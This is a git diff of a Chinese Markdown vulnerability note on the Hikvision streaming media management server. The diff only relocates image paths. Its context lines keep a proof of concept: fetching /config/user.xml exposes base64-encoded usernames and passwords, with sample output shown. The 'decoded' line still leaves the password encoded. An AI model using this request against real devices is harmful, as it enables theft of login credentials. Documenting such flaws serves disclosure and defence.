@@ -20,7 +20,7 @@ Hikvision 流媒体管理服务器
 
 登陆页面
 
-![image-20220519172629739](images/202205191726829.png)
+![image-20220519172629739](../.gitbook/assets/202205191726829.png)
 
 POC
 
@@ -28,7 +28,7 @@ POC
 /config/user.xml
 ```
 
-![image-20220519172714407](images/202205191727443.png)
+![image-20220519172714407](../.gitbook/assets/202205191727443.png)
 
 ```
 <user name="YWRtaW4=" password="MTIzNDU="/>
@@ -39,4 +39,3 @@ base64解密
 ```
 <user name="admin" password="MTIzNDU="/>
 ```
-
